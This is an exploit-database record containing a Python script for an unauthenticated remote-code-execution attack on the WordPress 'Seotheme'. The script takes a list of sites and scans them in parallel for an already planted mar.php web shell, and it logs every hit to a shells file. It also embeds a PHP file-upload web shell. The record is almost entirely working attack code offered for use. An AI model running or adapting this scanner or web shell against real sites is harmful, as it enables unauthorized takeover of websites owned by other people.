{"source": "https://www.exploit-db.com/exploits/51789", "vulnName": "Wordpress Seotheme - Remote Code Execution Unauthenticated", "vulnEDBID": "51789", "vulnCVE": "N/A", "author": "MILAD KARIMI", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-02-09", "vulnContent": "# Exploit Title: Wordpress Seotheme - Remote Code Execution Unauthenticated\n# Date: 2023-09-20\n# Author: Milad Karimi (Ex3ptionaL)\n# Category : webapps\n# Tested on: windows 10 , firefox\n\nimport sys , requests, re\nfrom multiprocessing.dummy import Pool\nfrom colorama import Fore\nfrom colorama import init\ninit(autoreset=True)\n\nfr  =   Fore.RED\nfc  =   Fore.CYAN\nfw  =   Fore.WHITE\nfg  =   Fore.GREEN\nfm  =   Fore.MAGENTA\n\nshell = \"\"\"<?php echo \"EX\"; echo \"<br>\".php_uname().\"<br>\"; echo \"<form method='post' enctype='multipart/form-data'> <input type='file' name='zb'><input type='submit' name='upload' value='upload'></form>\"; if($_POST['upload']) { if(@copy($_FILES['zb']['tmp_name'], $_FILES['zb']['name'])) { echo \"eXploiting Done\"; } else { echo \"Failed to Upload.\"; } } ?>\"\"\"\nrequests.urllib3.disable_warnings()\nheaders = {'Connection': 'keep-alive',\n            'Cache-Control': 'max-age=0',\n            'Upgrade-Insecure-Requests': '1',\n            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',\n            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',\n            'Accept-Encoding': 'gzip, deflate',\n            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',\n            'referer': 'www.google.com'}\ntry:\n    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]\nexcept IndexError:\n    path = str(sys.argv[0]).split('\\\\')\n    exit('\\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')\n\ndef URLdomain(site):\n    if site.startswith(\"http://\") :\n        site = site.replace(\"http://\",\"\")\n    elif site.startswith(\"https://\") :\n        site = site.replace(\"https://\",\"\")\n    else :\n        pass\n    pattern = re.compile('(.*)/')\n    while re.findall(pattern,site):\n        sitez = re.findall(pattern,site)\n        site = sitez[0]\n    return site\n\n\ndef FourHundredThree(url):\n    try:\n        url = 'http://' + URLdomain(url)\n        check = requests.get(url+'/wp-content/plugins/seoplugins/mar.php',headers=headers, allow_redirects=True,timeout=15)\n        if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content:\n                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)\n                open('seoplugins-Shells.txt', 'a').write(url + '/wp-content/plugins/seoplugins/mar.php\\n')\n        else:\n            url = 'https://' + URLdomain(url)\n            check = requests.get(url+'/wp-content/plugins/seoplugins/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)\n            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content:\n                    print ' -| ' + url + ' --> {}[Succefully]'.format(fg)\n                    open('seoplugins-Shells.txt', 'a').write(url + '/wp-content/plugins/seoplugins/mar.php\\n')\n            else:\n                print ' -| ' + url + ' --> {}[Failed]'.format(fr)\n                url = 'http://' + URLdomain(url)\n        check = requests.get(url+'/wp-content/themes/seotheme/mar.php',headers=headers, allow_redirects=True,timeout=15)\n        if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content:\n                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)\n                open('seotheme-Shells.txt', 'a').write(url + '/wp-content/themes/seotheme/mar.php\\n')\n        else:\n            url = 'https://' + URLdomain(url)\n            check = requests.get(url+'/wp-content/themes/seotheme/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)\n            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content:\n                    print ' -| ' + url + ' --> {}[Succefully]'.format(fg)\n                    open('seotheme-Shells.txt', 'a').write(url + '/wp-content/themes/seotheme/mar.php\\n')\n            else:\n                print ' -| ' + url + ' --> {}[Failed]'.format(fr)\n    except :\n        print ' -| ' + url + ' --> {}[Failed]'.format(fr)\n\nmp = Pool(100)\nmp.map(FourHundredThree, target)\nmp.close()\nmp.join()\n\nprint '\\n [!] {}Saved in Shells.txt'.format(fc)\n            "}